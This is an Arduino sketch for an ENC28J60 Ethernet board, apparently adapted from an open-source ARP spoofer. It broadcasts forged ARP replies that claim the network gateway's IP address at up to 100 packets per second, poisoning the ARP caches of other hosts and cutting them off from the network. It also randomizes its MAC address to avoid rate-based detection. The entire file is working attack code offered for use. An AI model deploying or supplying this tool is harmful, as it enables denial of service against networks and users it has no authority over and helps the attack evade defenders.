/*
  ===========================================
  Original Copyright (c) 2017 Stefan Kremser
             github.com/spacehuhn
  Modifications Copyright (c) 2023 LeonardSEO
  ===========================================
*/


#include <enc28j60.h>
#include <EtherCard.h>
#include <net.h>

#define led 13
#define MAX_RETRIES 5
#define MAX_PACKETS 500

int packetRate = 50; // packets send per second
static uint8_t mymac[] = { 0xc0, 0xab, 0x03, 0x22, 0x55, 0x99 };
byte Ethernet::buffer[400];

int arp_count = 0;
unsigned long prevTime = 0;
bool connection = false;
int packet_counter = 0;
unsigned long counter_reset_time = 0;

uint8_t _data[48] = {
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x08, 0x06,
  0x00, 0x01,
  0x08, 0x00,
  0x06, 0x04,
  0x00, 0x02,
  0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
  0xc0, 0xa8, 0x02, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF
};

// Function to generate a random MAC address
void generateRandomMAC(uint8_t *mac) {
  for(int i=0; i<6; i++)
    mac[i] = random(0, 255);
}

// Function to update the packet rate and MAC address
void updatePacketRate() {
  long curTime = millis();
  
  if (packet_counter > MAX_PACKETS && curTime - counter_reset_time < 1000) {
    packetRate = max(1, packetRate - 5); // Decrease packet rate by 5
    generateRandomMAC(_data + 6); // Set source MAC to a random value
    generateRandomMAC(mymac); // Change mymac to a random value
  }

  if (curTime - counter_reset_time > 1000) {
    packet_counter = 0;
    counter_reset_time = curTime;
    packetRate = min(100, packetRate + 1); // Increase packet rate
  }
}

// Function to send ARP packets
bool sendARP() {
  long curTime = millis();

  if (curTime - prevTime > 1000/packetRate) {
    digitalWrite(led, HIGH);

    for (int i = 0; i < 48; i++) ether.buffer[i] = _data[i];

    ether.packetSend(48);
    arp_count++;
    prevTime = curTime;
    packet_counter++;

    digitalWrite(led, LOW);

    updatePacketRate();

    return true;
  }

  return false;
}

// Function to connect to the network
void connectToNetwork() {
  int retries = 0;
  while (retries < MAX_RETRIES) {
    if (!ether.dhcpSetup()) {
      retries++;
      delay(1000);
    } else {
      for (int i = 0; i < 4; i++) _data[28 + i] =  ether.gwip[i];
      for (int i = 0; i < 6; i++) _data[6 + i] = _data[22 + i] = mymac[i];
      for (int i = 0; i < 48; i++) ether.buffer[i] = _data[i];

      connection = true;
      break;
    }
  }
}

// Setup function
void setup() {
  pinMode(led, OUTPUT);
  Serial.begin(115200);
  delay(2000);
  Serial.println("ready!");

  if (ether.begin(sizeof Ethernet::buffer, mymac) == 0) {
    Serial.println("Failed to access Ethernet controller");
    while(1);
  }

  connectToNetwork();
}

// Loop function
void loop() {
  if (connection) sendARP();
  else digitalWrite(led, LOW); // No Connection, turn off STATUS LED
}
